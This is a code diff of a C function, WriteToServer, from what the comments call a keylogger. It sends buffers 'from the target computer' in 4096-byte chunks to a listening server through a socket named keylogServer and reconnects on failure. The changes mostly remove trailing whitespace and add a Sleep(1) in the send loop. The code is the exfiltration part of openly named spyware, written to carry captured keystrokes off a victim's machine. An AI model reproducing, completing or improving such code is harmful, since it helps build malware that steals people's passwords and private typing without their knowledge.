@@ -63,19 +63,19 @@ return true;
 /**
     Title: WriteToServer
     Description: takes in a pointer to a character to a buffer  and writes it to the server, if the message is greater
-    then 4096 bytes. then it is broken up into 4096 byte blocks and sent to the listening server. on the event of an 
+    then 4096 bytes. then it is broken up into 4096 byte blocks and sent to the listening server. on the event of an
     error this function should return false and let the keylogger process attempt to reconnect, if all messages are recived
-    by the client and the socket has not been closed, then this process should return true. 
+    by the client and the socket has not been closed, then this process should return true.
 
     @param buffer, the byte buffer to be written from the target computer to the server.
-    
+
     @return a boolean value indicating if the buffer was successfully written to the server.
 */
 
 bool WriteToServer(const char* buffer)
 {
    /*
-     if the length of the buffer is greater then 4096 bytes 
+     if the length of the buffer is greater then 4096 bytes
    */
     if(strlen(buffer)>0x1000)
     {
@@ -88,6 +88,7 @@ bool WriteToServer(const char* buffer)
        */
         for(int x=0; (strlen(buffer)-(x*0x1000))>0;x++)
         {
+         Sleep(1);
          /*
             if the buffer is still longer then 4096 bytes then send exactly 4096 bytes to the server
          */
@@ -113,12 +114,12 @@ bool WriteToServer(const char* buffer)
 
                 }
            /*
-              if the remaining buffer is less then 4096 bytes then transmit the entire buffer. to the server 
+              if the remaining buffer is less then 4096 bytes then transmit the entire buffer. to the server
            */
             else
                 {
                     /*
-                      zero out the temp buffer 
+                      zero out the temp buffer
                     */
                     memset(temp,0,0x1000);
                    /*
@@ -131,11 +132,11 @@ bool WriteToServer(const char* buffer)
                     if (send(keylogServer,temp,strlen(temp)+1,0) ==SOCKET_ERROR)
                         return false;
                     /*
-                      the data was successfully sent and the socket is still open, return true. 
+                      the data was successfully sent and the socket is still open, return true.
                     */
                     return true;
                 }
-           
+
         }
     }
    /*
@@ -143,14 +144,14 @@ bool WriteToServer(const char* buffer)
    */
     else
     {
-     /* 
-       if the socket has failed or the data was not sent properly then return false so this program can 
+     /*
+       if the socket has failed or the data was not sent properly then return false so this program can
        attempt to re-establish a connection.
      */
     if (send(keylogServer,buffer,strlen(buffer)+1,0) ==SOCKET_ERROR)
         return false;
     }
-    /* 
+    /*
       all is good with the world, return true the data has been sent successfully
     */
     return true;
